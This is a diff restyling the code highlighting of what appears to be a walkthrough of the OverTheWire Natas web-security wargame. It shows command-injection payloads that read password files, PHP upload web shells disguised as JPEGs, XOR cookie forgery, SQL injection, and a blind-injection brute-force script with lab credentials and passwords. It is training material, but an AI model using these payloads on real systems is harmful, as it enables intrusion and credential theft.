@@ -110,7 +110,7 @@ Referer header to our HTTP request:</p>
 <h2 id="6">6</h2>
 
 <p>Inspecting the site, we see that the following cookie has been set:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">loggedin <span style="color:#666">=</span> <span style="color:#40a070">0</span>;
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">loggedin = 0;
 </code></pre></div>
 <p>Change this cookie to 1, and the password is returned.</p>
 
@@ -139,13 +139,13 @@ password.</p>
 <p>Looking at the source code, we see that the secret, when encoded must match:
 <code>3d3d516343746d4d6d6c315669563362</code>. To find out the clear text secret, we can
 reverse the encoding steps:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#007020">&lt;?php</span>
-<span style="color:#666">&gt;</span> hex2bin(<span style="color:#4070a0">&#34;3d3d516343746d4d6d6c315669563362&#34;</span>);
-<span style="color:#4070a0">&#34;==QcCtmMml1ViV3b&#34;</span>
-<span style="color:#666">&gt;</span> strrev(<span style="color:#4070a0">&#34;==QcCtmMml1ViV3b&#34;</span>);
-<span style="color:#4070a0">&#34;b3ViV1lmMmtCcQ==&#34;</span>
-<span style="color:#666">&gt;</span> base64_decode(<span style="color:#4070a0">&#34;b3ViV1lmMmtCcQ==&#34;</span>);
-<span style="color:#4070a0">&#34;oubWYf2kBq&#34;</span>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#00f">&lt;?php</span>
+&gt; hex2bin(<span style="color:#a31515">&#34;3d3d516343746d4d6d6c315669563362&#34;</span>);
+<span style="color:#a31515">&#34;==QcCtmMml1ViV3b&#34;</span>
+&gt; strrev(<span style="color:#a31515">&#34;==QcCtmMml1ViV3b&#34;</span>);
+<span style="color:#a31515">&#34;b3ViV1lmMmtCcQ==&#34;</span>
+&gt; base64_decode(<span style="color:#a31515">&#34;b3ViV1lmMmtCcQ==&#34;</span>);
+<span style="color:#a31515">&#34;oubWYf2kBq&#34;</span>
 </code></pre></div>
 <p>Submit this secret to see the password.</p>
 
@@ -155,10 +155,10 @@ reverse the encoding steps:</p>
 
 <p>In this level, user input is passed to the PHP
 <a href="https://secure.php.net/manual/en/function.passthru.php">passthru</a> function:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">passthru(&#34;grep -i $key dictionary.txt&#34;);</code></pre></div>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">passthru(&#34;grep -i $key dictionary.txt&#34;);</code></pre></div>
 <p>We can terminate the <code>grep</code> with a semicolon, run an arbitrary command, and
 comment any code that comes after with:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">; cat /etc/natas_webpass/natas10 #</code></pre></div>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">; cat /etc/natas_webpass/natas10 #</code></pre></div>
 <p>Here, we return the contents of the password file with <code>cat</code>:</p>
 
 <p><code>s09byvi8880wqhbnonMFMW8byCojm8eA</code></p>
@@ -168,14 +168,14 @@ comment any code that comes after with:</p>
 <p>This level is the same as level <a href="#10">10</a>, but the characters <code>;</code>, <code>|</code> and <code>&amp;</code>
 are blocked by the server. We can utilise the <code>grep</code> to search for everything in
 the password file:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">.* /etc/natas_webpass/natas11 #</code></pre></div>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">.* /etc/natas_webpass/natas11 #</code></pre></div>
 <p><code>SUIRtXqbB3tWzTOgTAX2t8UfMbYKrgp6</code></p>
 
 <h2 id="12">12</h2>
 
 <p>In this level, we need to set a cookie, such that when it is base64 decoded and
 XOR decrypted with an unkown key, it returns the JSON string:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{ <span style="color:#062873;font-weight:bold">&#34;showpassword&#34;</span>: <span style="color:#4070a0">&#34;yes&#34;</span>, <span style="color:#062873;font-weight:bold">&#34;bgcolor&#34;</span>: <span style="color:#4070a0">&#34;#ffffff&#34;</span> }</code></pre></div>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{ &#34;showpassword&#34;: <span style="color:#a31515">&#34;yes&#34;</span>, &#34;bgcolor&#34;: <span style="color:#a31515">&#34;#ffffff&#34;</span> }</code></pre></div>
 <p>To do this, we need to work out the XOR encryption key. Luckily, XOR encryption
 has the following property:</p>
 
@@ -187,22 +187,22 @@ encrypted_secret XOR secret = key
 we can work out the key.</p>
 
 <p>Looking through the server source code, we see that the default secret is:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{ <span style="color:#062873;font-weight:bold">&#34;showpassword&#34;</span>: <span style="color:#4070a0">&#34;no&#34;</span>, <span style="color:#062873;font-weight:bold">&#34;bgcolor&#34;</span>: <span style="color:#4070a0">&#34;#ffffff&#34;</span> }</code></pre></div>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{ &#34;showpassword&#34;: <span style="color:#a31515">&#34;no&#34;</span>, &#34;bgcolor&#34;: <span style="color:#a31515">&#34;#ffffff&#34;</span> }</code></pre></div>
 <p>And by looking at the cookie returned, we can see that the encrypted secret is:</p>
 
 <pre><code>ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
 </code></pre>
 
 <p>We can perform the XOR with the following code:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#007020">&lt;?php</span>
-<span style="color:#bb60d5">$origData</span> <span style="color:#666">=</span> base64_decode(
-    <span style="color:#4070a0">&#34;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&#34;</span>);
-<span style="color:#bb60d5">$key</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;{&#34;showpassword&#34;:&#34;no&#34;,&#34;bgcolor&#34;:&#34;#ffffff&#34;}&#39;</span>;
-<span style="color:#bb60d5">$outText</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#34;&#34;</span>;
-<span style="color:#007020;font-weight:bold">for</span> (<span style="color:#bb60d5">$i</span> <span style="color:#666">=</span> <span style="color:#40a070">0</span>; <span style="color:#bb60d5">$i</span> <span style="color:#666">&lt;</span> strlen(origData); <span style="color:#bb60d5">$i</span><span style="color:#666">++</span>) {
-    <span style="color:#bb60d5">$outText</span> <span style="color:#666">.=</span> <span style="color:#bb60d5">$origData</span>[<span style="color:#bb60d5">$i</span>] <span style="color:#666">^</span> <span style="color:#bb60d5">$key</span>[<span style="color:#bb60d5">$i</span> <span style="color:#666">%</span> strlen(<span style="color:#bb60d5">$key</span>)];
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#00f">&lt;?php</span>
+$origData = base64_decode(
+    <span style="color:#a31515">&#34;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&#34;</span>);
+$key = <span style="color:#a31515">&#39;{&#34;showpassword&#34;:&#34;no&#34;,&#34;bgcolor&#34;:&#34;#ffffff&#34;}&#39;</span>;
+$outText = <span style="color:#a31515">&#34;&#34;</span>;
+<span style="color:#00f">for</span> ($i = 0; $i &lt; strlen(origData); $i++) {
+    $outText .= $origData[$i] ^ $key[$i % strlen($key)];
 }
-<span style="color:#007020;font-weight:bold">echo</span> <span style="color:#bb60d5">$outText</span>;
+<span style="color:#00f">echo</span> $outText;
 </code></pre></div>
 <p>Running this gives the output:</p>
 
@@ -211,26 +211,26 @@ we can work out the key.</p>
 
 <p>We see that this is the string <code>qw8J</code> repeated. We then use this key to encrypt
 our original JOSN string:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#007020">&lt;?php</span>
-<span style="color:#60a0b0;font-style:italic">// xor_encrypt is taken from the server source code
-</span><span style="color:#60a0b0;font-style:italic"></span><span style="color:#007020;font-weight:bold">function</span> <span style="color:#06287e">xor_encrypt</span>(<span style="color:#bb60d5">$in</span>) {
-    <span style="color:#bb60d5">$key</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;qw8J&#39;</span>;
-    <span style="color:#bb60d5">$text</span> <span style="color:#666">=</span> <span style="color:#bb60d5">$in</span>;
-    <span style="color:#bb60d5">$outText</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;&#39;</span>;
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#00f">&lt;?php</span>
+<span style="color:#008000">// xor_encrypt is taken from the server source code
+</span><span style="color:#008000"></span><span style="color:#00f">function</span> xor_encrypt($in) {
+    $key = <span style="color:#a31515">&#39;qw8J&#39;</span>;
+    $text = $in;
+    $outText = <span style="color:#a31515">&#39;&#39;</span>;
 
-    <span style="color:#60a0b0;font-style:italic">// Iterate through each character
-</span><span style="color:#60a0b0;font-style:italic"></span>    <span style="color:#007020;font-weight:bold">for</span>(<span style="color:#bb60d5">$i</span><span style="color:#666">=</span><span style="color:#40a070">0</span>;<span style="color:#bb60d5">$i</span><span style="color:#666">&lt;</span>strlen(<span style="color:#bb60d5">$text</span>);<span style="color:#bb60d5">$i</span><span style="color:#666">++</span>) {
-    <span style="color:#bb60d5">$outText</span> <span style="color:#666">.=</span> <span style="color:#bb60d5">$text</span>[<span style="color:#bb60d5">$i</span>] <span style="color:#666">^</span> <span style="color:#bb60d5">$key</span>[<span style="color:#bb60d5">$i</span> <span style="color:#666">%</span> strlen(<span style="color:#bb60d5">$key</span>)];
+    <span style="color:#008000">// Iterate through each character
+</span><span style="color:#008000"></span>    <span style="color:#00f">for</span>($i=0;$i&lt;strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
     }
 
-    <span style="color:#007020;font-weight:bold">return</span> <span style="color:#bb60d5">$outText</span>;
+    <span style="color:#00f">return</span> $outText;
 }
-<span style="color:#007020;font-weight:bold">echo</span> base64_encode(xor_encrypt(<span style="color:#4070a0">&#39;{&#34;showpassword&#34;:&#34;yes&#34;,&#34;bgcolor&#34;:&#34;#ffffff&#34;}&#39;</span>));
+<span style="color:#00f">echo</span> base64_encode(xor_encrypt(<span style="color:#a31515">&#39;{&#34;showpassword&#34;:&#34;yes&#34;,&#34;bgcolor&#34;:&#34;#ffffff&#34;}&#39;</span>));
 </code></pre></div>
 <p>This gives our desired cookie, <code>EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</code>. We set this
 by running the following JavaScript in the browser console:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#007020">document</span>.cookie <span style="color:#666">=</span>
-  <span style="color:#4070a0">&#34;data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK&#34;</span>;
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">document.cookie =
+  <span style="color:#a31515">&#34;data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK&#34;</span>;
 </code></pre></div>
 <p>Clicking on the <code>set color</code> button returns the password:</p>
 
@@ -241,8 +241,8 @@ by running the following JavaScript in the browser console:</p>
 <p>In this level, a file is uploaded to the server, via an HTML form. Looking at
 the source code, we see that the form has a few elements, which are initially
 hidden:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;<span style="color:#062873;font-weight:bold">input</span> <span style="color:#4070a0">type</span><span style="color:#666">=</span><span style="color:#4070a0">&#34;hidden&#34;</span> <span style="color:#4070a0">name</span><span style="color:#666">=</span><span style="color:#4070a0">&#34;MAX_FILE_SIZE&#34;</span> <span style="color:#4070a0">value</span><span style="color:#666">=</span><span style="color:#4070a0">&#34;1000&#34;</span> /&gt;
-&lt;<span style="color:#062873;font-weight:bold">input</span> <span style="color:#4070a0">type</span><span style="color:#666">=</span><span style="color:#4070a0">&#34;hidden&#34;</span> <span style="color:#4070a0">name</span><span style="color:#666">=</span><span style="color:#4070a0">&#34;filename&#34;</span> <span style="color:#4070a0">value</span><span style="color:#666">=</span><span style="color:#4070a0">&#34;</span><span style="color:#007020">&lt;?</span> <span style="color:#007020;font-weight:bold">print</span> genRandomString(); <span style="color:#007020">?&gt;</span><span style="color:#4070a0">.jpg&#34;</span> /&gt;
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;input type=<span style="color:#a31515">&#34;hidden&#34;</span> name=<span style="color:#a31515">&#34;MAX_FILE_SIZE&#34;</span> value=<span style="color:#a31515">&#34;1000&#34;</span> /&gt;
+&lt;input type=<span style="color:#a31515">&#34;hidden&#34;</span> name=<span style="color:#a31515">&#34;filename&#34;</span> value=<span style="color:#a31515">&#34;</span><span style="color:#00f">&lt;?</span> <span style="color:#00f">print</span> genRandomString(); <span style="color:#00f">?&gt;</span><span style="color:#a31515">.jpg&#34;</span> /&gt;
 </code></pre></div>
 <p>When writing the file to disk, the server code generates a random name for the
 file. However, the extension given to the file is pulled from the hidden
@@ -255,8 +255,8 @@ a <code>.php</code> extension will cause it to execute it as a PHP file.</p>
 
 <p>We can therefore get the password by changing the text of the <code>filename</code> input
 to <code>file.php</code> uploading the file:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#007020">&lt;?php</span>
-passthru(<span style="color:#4070a0">&#39;cat /etc/natas_webpass/natas13&#39;</span>);
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#00f">&lt;?php</span>
+passthru(<span style="color:#a31515">&#39;cat /etc/natas_webpass/natas13&#39;</span>);
 </code></pre></div>
 <p>Submitting the form displays a link to the file. When we click on the link, the
 PHP code is executed and the password is displayed.</p>
@@ -277,11 +277,11 @@ to be. We can therefore trick the function by supplying a file which starts with
 the first few bytes of an image format. For example, <code>jpeg</code> files start with the
 number <code>0xFFD8FFE0</code>. We can create a <code>php</code> script with the correct starting
 bytes with the following <code>python</code> code:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#007020;font-weight:bold">with</span> <span style="color:#007020">open</span>(<span style="color:#4070a0">&#34;script.php&#34;</span>, <span style="color:#4070a0">&#34;w&#34;</span>) <span style="color:#007020;font-weight:bold">as</span> f:
-    f<span style="color:#666">.</span>write(<span style="color:#4070a0">&#39;</span><span style="color:#4070a0;font-weight:bold">\xFF\xD8\xFF\xE0</span><span style="color:#4070a0">&#39;</span>)
-    f<span style="color:#666">.</span>write(<span style="color:#4070a0">&#34;&#34;&#34;&lt;?php
-</span><span style="color:#4070a0">passthru(&#39;cat /etc/natas_webpass/natas14&#39;);
-</span><span style="color:#4070a0">&#34;&#34;&#34;</span>)</code></pre></div>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#00f">with</span> open(<span style="color:#a31515">&#34;script.php&#34;</span>, <span style="color:#a31515">&#34;w&#34;</span>) <span style="color:#00f">as</span> f:
+    f.write(<span style="color:#a31515">&#39;</span><span style="color:#a31515">\xFF\xD8\xFF\xE0</span><span style="color:#a31515">&#39;</span>)
+    f.write(<span style="color:#a31515">&#34;&#34;&#34;&lt;?php
+</span><span style="color:#a31515">passthru(&#39;cat /etc/natas_webpass/natas14&#39;);
+</span><span style="color:#a31515">&#34;&#34;&#34;</span>)</code></pre></div>
 <p>Uploading this file and changing the <code>filename</code> input extension to <code>.php</code> as
 before prints out the password.</p>
 
@@ -293,11 +293,11 @@ before prints out the password.</p>
 
 <p>Level 15 features a SQL injection attack. The following query is executed
 against a MySQL database:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#007020">&lt;?php</span>
-<span style="color:#bb60d5">$query</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#34;SELECT * from users where username=</span><span style="color:#4070a0;font-weight:bold">\&#34;</span><span style="color:#4070a0">&#34;</span>
-    <span style="color:#666">.</span><span style="color:#bb60d5">$_REQUEST</span>[<span style="color:#4070a0">&#34;username&#34;</span>]
-    <span style="color:#666">.</span><span style="color:#4070a0">&#34;</span><span style="color:#4070a0;font-weight:bold">\&#34;</span><span style="color:#4070a0"> and password=</span><span style="color:#4070a0;font-weight:bold">\&#34;</span><span style="color:#4070a0">&#34;</span>
-    <span style="color:#666">.</span><span style="color:#bb60d5">$_REQUEST</span>[<span style="color:#4070a0">&#34;password&#34;</span>]<span style="color:#666">.</span><span style="color:#4070a0">&#34;</span><span style="color:#4070a0;font-weight:bold">\&#34;</span><span style="color:#4070a0">&#34;</span>;
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#00f">&lt;?php</span>
+$query = <span style="color:#a31515">&#34;SELECT * from users where username=</span><span style="color:#a31515">\&#34;</span><span style="color:#a31515">&#34;</span>
+    .$_REQUEST[<span style="color:#a31515">&#34;username&#34;</span>]
+    .<span style="color:#a31515">&#34;</span><span style="color:#a31515">\&#34;</span><span style="color:#a31515"> and password=</span><span style="color:#a31515">\&#34;</span><span style="color:#a31515">&#34;</span>
+    .$_REQUEST[<span style="color:#a31515">&#34;password&#34;</span>].<span style="color:#a31515">&#34;</span><span style="color:#a31515">\&#34;</span><span style="color:#a31515">&#34;</span>;
 </code></pre></div>
 <p>We can see that the <code>username</code> and <code>password</code> sections of the query string
 aren&rsquo;t sanitised. If a request is made that returns &gt; 0 rows, the password is
@@ -307,7 +307,7 @@ which is to be executed, making it easier to debug.</p>
 <p>Looking at the query, need to construct a statement which reutrns a row.</p>
 
 <p>The statement:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#007020;font-weight:bold">SELECT</span> <span style="color:#666">*</span> <span style="color:#007020;font-weight:bold">from</span> users <span style="color:#007020;font-weight:bold">where</span> username<span style="color:#666">=</span><span style="color:#4070a0">&#34;&#34;</span> <span style="color:#007020;font-weight:bold">or</span> <span style="color:#4070a0">&#34;1&#34;</span><span style="color:#666">=</span><span style="color:#4070a0">&#34;1&#34;</span> <span style="color:#007020;font-weight:bold">and</span> password<span style="color:#666">=</span><span style="color:#4070a0">&#34;&#34;</span> <span style="color:#007020;font-weight:bold">or</span> <span style="color:#4070a0">&#34;1&#34;</span><span style="color:#666">=</span><span style="color:#4070a0">&#34;1&#34;</span></code></pre></div>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#00f">SELECT</span> * <span style="color:#00f">from</span> users <span style="color:#00f">where</span> username=<span style="color:#a31515">&#34;&#34;</span> <span style="color:#00f">or</span> <span style="color:#a31515">&#34;1&#34;</span>=<span style="color:#a31515">&#34;1&#34;</span> <span style="color:#00f">and</span> password=<span style="color:#a31515">&#34;&#34;</span> <span style="color:#00f">or</span> <span style="color:#a31515">&#34;1&#34;</span>=<span style="color:#a31515">&#34;1&#34;</span></code></pre></div>
 <p>Makes use of SQL tautologies to return rows.</p>
 
 <p>We can run this command by calling the URL with the following query string:</p>
@@ -329,7 +329,7 @@ password.</p>
 <p>We can construct a SQL query which leaks information about the user&rsquo;s password.
 The following query makes use of the MySQL <code>LIKE</code> function, which pattern
 matches a field.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#007020;font-weight:bold">SELECT</span> <span style="color:#666">*</span> <span style="color:#007020;font-weight:bold">from</span> users <span style="color:#007020;font-weight:bold">where</span> username<span style="color:#666">=</span><span style="color:#4070a0">&#34;natas16&#34;</span> <span style="color:#007020;font-weight:bold">AND</span> password <span style="color:#007020;font-weight:bold">LIKE</span> <span style="color:#007020">BINARY</span> <span style="color:#4070a0">&#34;a%&#34;</span></code></pre></div>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#00f">SELECT</span> * <span style="color:#00f">from</span> users <span style="color:#00f">where</span> username=<span style="color:#a31515">&#34;natas16&#34;</span> <span style="color:#00f">AND</span> password <span style="color:#00f">LIKE</span> BINARY <span style="color:#a31515">&#34;a%&#34;</span></code></pre></div>
 <p>The query tests whether there is a user named <code>natas16</code>, with a password that
 starts with the letter <code>a</code>. If there is, the webpage says &ldquo;This user exists&rdquo;. If
 there isn&rsquo;t the webpage says &ldquo;This user doesn&rsquo;t exist&rdquo;. The web app leaks some
@@ -338,78 +338,78 @@ letters <code>b, c, ...</code>, until we find a match. We can then repeat the pr
 the second characted, and repeat that until we have the full password.</p>
 
 <p>The following code does this:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#60a0b0;font-style:italic"># -*- coding: utf-8 -*-</span>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000"># -*- coding: utf-8 -*-</span>
 
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">logging</span>
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">string</span>
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">sys</span>
+<span style="color:#00f">import</span> logging
+<span style="color:#00f">import</span> string
+<span style="color:#00f">import</span> sys
 
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">requests</span>
-<span style="color:#007020;font-weight:bold">from</span> <span style="color:#0e84b5;font-weight:bold">bs4</span> <span style="color:#007020;font-weight:bold">import</span> BeautifulSoup
-
-
-logging<span style="color:#666">.</span>basicConfig(level<span style="color:#666">=</span>logging<span style="color:#666">.</span>DEBUG, stream<span style="color:#666">=</span>sys<span style="color:#666">.</span>stderr)
-logger <span style="color:#666">=</span> logging<span style="color:#666">.</span>getLogger(__name__)
-<span style="color:#60a0b0;font-style:italic"># Silence noisy urllib3 debug logs</span>
-logging<span style="color:#666">.</span>getLogger(<span style="color:#4070a0">&#34;urllib3&#34;</span>)<span style="color:#666">.</span>setLevel(logging<span style="color:#666">.</span>CRITICAL)
+<span style="color:#00f">import</span> requests
+<span style="color:#00f">from</span> bs4 <span style="color:#00f">import</span> BeautifulSoup
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">get_page_text</span>(query_dict):
-    query_dict[<span style="color:#4070a0">&#34;debug&#34;</span>] <span style="color:#666">=</span> <span style="color:#4070a0">&#34;1&#34;</span>
-    r <span style="color:#666">=</span> requests<span style="color:#666">.</span>get(
-        <span style="color:#4070a0">&#34;http://natas15.natas.labs.overthewire.org&#34;</span>,
-        auth<span style="color:#666">=</span>(<span style="color:#4070a0">&#34;natas15&#34;</span>, <span style="color:#4070a0">&#34;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&#34;</span>),
-        params<span style="color:#666">=</span>query_dict)
-    <span style="color:#007020;font-weight:bold">return</span> r<span style="color:#666">.</span>text
+logging.basicConfig(level=logging.DEBUG, stream=sys.stderr)
+logger = logging.getLogger(__name__)
+<span style="color:#008000"># Silence noisy urllib3 debug logs</span>
+logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel(logging.CRITICAL)
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">does_user_exist</span>(body):
-    html <span style="color:#666">=</span> BeautifulSoup(body, <span style="color:#4070a0">&#34;html.parser&#34;</span>)
-    text <span style="color:#666">=</span> html<span style="color:#666">.</span>find(<span style="color:#007020">id</span><span style="color:#666">=</span><span style="color:#4070a0">&#34;content&#34;</span>)<span style="color:#666">.</span>get_text()<span style="color:#666">.</span>strip()
-    logger<span style="color:#666">.</span>debug(text)
-    <span style="color:#007020;font-weight:bold">return</span> <span style="color:#4070a0">&#34;This user exists&#34;</span> <span style="color:#007020;font-weight:bold">in</span> text
+<span style="color:#00f">def</span> get_page_text(query_dict):
+    query_dict[<span style="color:#a31515">&#34;debug&#34;</span>] = <span style="color:#a31515">&#34;1&#34;</span>
+    r = requests.get(
+        <span style="color:#a31515">&#34;http://natas15.natas.labs.overthewire.org&#34;</span>,
+        auth=(<span style="color:#a31515">&#34;natas15&#34;</span>, <span style="color:#a31515">&#34;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&#34;</span>),
+        params=query_dict)
+    <span style="color:#00f">return</span> r.text
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">get_next_char</span>(index, possible_chars):
-    next_index <span style="color:#666">=</span> index <span style="color:#666">+</span> <span style="color:#40a070">1</span>
-    <span style="color:#007020;font-weight:bold">return</span> next_index, possible_chars[index]
+<span style="color:#00f">def</span> does_user_exist(body):
+    html = BeautifulSoup(body, <span style="color:#a31515">&#34;html.parser&#34;</span>)
+    text = html.find(id=<span style="color:#a31515">&#34;content&#34;</span>).get_text().strip()
+    logger.debug(text)
+    <span style="color:#00f">return</span> <span style="color:#a31515">&#34;This user exists&#34;</span> <span style="color:#00f">in</span> text
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">get_password</span>():
-    <span style="color:#60a0b0;font-style:italic"># All previous passwords contined only numbers and lower/upper case</span>
-    <span style="color:#60a0b0;font-style:italic"># letters. Let&#39;s assume that the same is true for this password.</span>
-    possible_chars <span style="color:#666">=</span> <span style="color:#4070a0">&#34;&#34;</span><span style="color:#666">.</span>join([
-        string<span style="color:#666">.</span>lowercase,
-        string<span style="color:#666">.</span>uppercase,
-        <span style="color:#4070a0">&#34;&#34;</span><span style="color:#666">.</span>join(<span style="color:#007020">map</span>(<span style="color:#007020">str</span>, <span style="color:#007020">range</span>(<span style="color:#40a070">10</span>)))
+<span style="color:#00f">def</span> get_next_char(index, possible_chars):
+    next_index = index + 1
+    <span style="color:#00f">return</span> next_index, possible_chars[index]
+
+
+<span style="color:#00f">def</span> get_password():
+    <span style="color:#008000"># All previous passwords contined only numbers and lower/upper case</span>
+    <span style="color:#008000"># letters. Let&#39;s assume that the same is true for this password.</span>
+    possible_chars = <span style="color:#a31515">&#34;&#34;</span>.join([
+        string.lowercase,
+        string.uppercase,
+        <span style="color:#a31515">&#34;&#34;</span>.join(map(str, range(10)))
     ])
 
-    password <span style="color:#666">=</span> <span style="color:#4070a0">&#34;&#34;</span>
-    index <span style="color:#666">=</span> <span style="color:#40a070">0</span>
-    <span style="color:#007020;font-weight:bold">while</span> True:
-        <span style="color:#007020;font-weight:bold">try</span>:
-            index, char <span style="color:#666">=</span> get_next_char(index, possible_chars)
-        <span style="color:#007020;font-weight:bold">except</span> <span style="color:#007020">IndexError</span>:
-            <span style="color:#60a0b0;font-style:italic"># None of the chars matched, assume that the password has been</span>
-            <span style="color:#60a0b0;font-style:italic"># guessed.</span>
-            <span style="color:#007020;font-weight:bold">return</span> password
-        password_guess <span style="color:#666">=</span> <span style="color:#4070a0">&#34;&#34;</span><span style="color:#666">.</span>join([password, char, <span style="color:#4070a0">&#34;%&#34;</span>])
-        text <span style="color:#666">=</span> get_page_text({
-            <span style="color:#4070a0">&#34;username&#34;</span>:
-                <span style="color:#4070a0">&#39;natas16&#34; AND password LIKE BINARY &#34;{0}&#39;</span><span style="color:#666">.</span>format(password_guess),
-            <span style="color:#4070a0">&#34;debug&#34;</span>: <span style="color:#4070a0">&#34;true&#34;</span>
+    password = <span style="color:#a31515">&#34;&#34;</span>
+    index = 0
+    <span style="color:#00f">while</span> True:
+        <span style="color:#00f">try</span>:
+            index, char = get_next_char(index, possible_chars)
+        <span style="color:#00f">except</span> IndexError:
+            <span style="color:#008000"># None of the chars matched, assume that the password has been</span>
+            <span style="color:#008000"># guessed.</span>
+            <span style="color:#00f">return</span> password
